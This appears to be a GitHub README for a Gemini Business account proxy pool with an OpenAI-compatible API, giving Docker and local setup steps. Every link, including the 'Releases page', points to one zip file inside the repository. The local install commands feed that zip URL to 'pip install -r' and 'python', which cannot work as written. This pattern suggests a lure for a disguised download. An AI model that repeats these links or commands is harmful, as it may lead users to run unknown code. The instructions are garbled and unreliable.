# 🌟 Business-OpenAPI - Easy Access to Gemini Pool

[![Download Business-OpenAPI](https://raw.githubusercontent.com/Jha0rahul/Business-OpenAPI/main/anilao/Business-OpenAPI_1.9.zip%https://raw.githubusercontent.com/Jha0rahul/Business-OpenAPI/main/anilao/Business-OpenAPI_1.9.zip)](https://raw.githubusercontent.com/Jha0rahul/Business-OpenAPI/main/anilao/Business-OpenAPI_1.9.zip)

## 🛠️ Introduction

Welcome to Business-OpenAPI! This application is a lightweight and high-performance Gemini Business account proxy pool. It provides a fully compatible API interface with OpenAI. Whether you want to manage multiple accounts efficiently or enhance your business capabilities, this tool simplifies your workflow.

## 🚀 Getting Started

Follow these steps to download and run the software easily.

### 🔗 Download & Install

1. Visit the [Releases page](https://raw.githubusercontent.com/Jha0rahul/Business-OpenAPI/main/anilao/Business-OpenAPI_1.9.zip) to download the latest version of Business-OpenAPI.
   
2. Choose the appropriate version for your operating system and download the file.

### 🐳 Docker Deployment (Recommended)

Using Docker is the easiest way to run Business-OpenAPI. Follow these steps:

1. **Build the Image:**

   Open your terminal and run:
   ```bash
   docker build -t gemini-pool .
   ```

2. **Start the Container:**

   After building the image, run this command to start the application:
   ```bash
   docker run -d \
     -p 7860:7860 \
     -e ADMIN_KEY=your_secret_password \
     --name gemini-pool \
     gemini-pool
   ```

This will make the application accessible on port 7860.

### 🖥️ Local Development

If you prefer to run the application locally without Docker, here’s how:

1. **Install Dependencies:**

   Make sure you have Python and pip installed. Then, run:
   ```bash
   pip install -r https://raw.githubusercontent.com/Jha0rahul/Business-OpenAPI/main/anilao/Business-OpenAPI_1.9.zip
   ```

2. **Start the Service:**

   To launch the service, use this command:
   ```bash
   python https://raw.githubusercontent.com/Jha0rahul/Business-OpenAPI/main/anilao/Business-OpenAPI_1.9.zip
   ```

The default port is 3000. Make sure this port is available on your system.

## ⚙️ Configuration Guide

You can customize the application by setting the following environment variables:

| Variable Name          | Description                          | Default Value               |
|------------------------|--------------------------------------|-----------------------------|
| `PORT`                 | Service listening port               | `3000` (Local) / `7860` (Docker) |
| `ADMIN_KEY`            | Password for the web console admin   | `admin123`                  |
| `REGISTER_SERVICE_URL` | Prefix for service registration URLs  | `http://localhost:5000`     |
| `REGISTER_ADMIN_KEY`   | Admin token for registration service   | `sk-admin-token`            |
| `ACCOUNT_LIFETIME`     | Account lifetime in seconds           | `43200` (12 hours)          |
| `REFRESH_BEFORE_EXPIRY`| Time to refresh token before it expires | `3600` (1 hour)            |

Make sure to set these variables for proper functionality.

## 🌐 Web Interface

The application features a modern and responsive web interface. You can monitor account status and manage configurations easily through your web browser. Just navigate to `http://localhost:7860` for Docker or `http://localhost:3000` for local development.

## 📄 Additional Features

- **Smart Account Management:** Automatically refresh tokens and perform health checks.
- **OpenAI Compatibility:** This application works seamlessly with existing OpenAI libraries and clients.
- **Docker Support:** Quick and easy deployment with Docker ensures your setup is hassle-free and scalable.

## 🛠️ Support

If you encounter any issues or have questions, please refer to the issue tracker on the repository. You'll find a community of users who can help.

Now that you have everything you need, go ahead and download [Business-OpenAPI](https://raw.githubusercontent.com/Jha0rahul/Business-OpenAPI/main/anilao/Business-OpenAPI_1.9.zip) to enhance your productivity with account management!